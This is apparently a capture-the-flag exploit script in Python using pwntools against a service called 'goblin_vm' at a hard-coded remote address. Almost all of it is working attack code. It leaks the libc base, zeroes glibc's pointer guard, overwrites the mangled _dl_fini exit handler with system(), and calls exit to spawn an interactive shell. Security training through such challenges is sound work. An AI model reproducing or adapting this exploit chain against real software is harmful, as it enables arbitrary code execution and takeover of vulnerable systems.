from pwn import *
from time import sleep
#io = process("./goblin_vm",aslr=True) 
# when aslr off, 
# &room = 0x555555558058
# &reg = 0x0000555555558050
# default room = 0x0000155555268010
# exit_funcs = 0x0000155555506f00

io = remote("15.165.237.71",8888)
#io = remote("0.0.0.0",8888)
libc = ELF("./libc.so.6")
io.sendlineafter("Hi, Do you want a large room?","N")

def sl(a,delay=0.1):
    sleep(delay)
    io.sendline(a)


rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


# timeout: the monitored command dumped core
# /home/ctf/run.sh: line 2:   573 Illegal instruction     timeout 60 /home/ctf/goblin_vm

# set *room = sh
sl("8 8")
sl("7 " + str(0x6873))
sl("1")


# Set reg = libc address
sl("8 2727096")
sl("2")

# leak libc
sl("10")

io.recvuntil("rax: ")
libc.address = int(io.recvline()) - libc.symbols["_IO_proc_close"]
log.info("LIBC BASE: " + hex(libc.address))

system = libc.symbols["system"]


# set room = fs+0x38
sl("9 2196824")

# set reg = 0
sl("7 0")

# set pointer_guard = 0
sl("1")

# set room=mangled(_dl_fini)+8
sl("8 2217904")

mangledSystem = rol(system,0x11,64) 
log.info("PTR_MANGLE(system): " + hex(mangledSystem))
# overwrite mangled _dl_fini with mangled system
# mangledSystem is so large that we have to write twice
# since unsigned long maximum = 0x7fffffffffffffff
sl("7 " + str(mangledSystem & 0xffffffff))
sl("1")

sl("8 12")
sl("7 " + str(mangledSystem >> 32))
sl("1")


# set arg of system to default room location
sl("8 12")
sl("7 " + str(system-871760))
sl("1")


# exit
sl("11")

io.interactive()
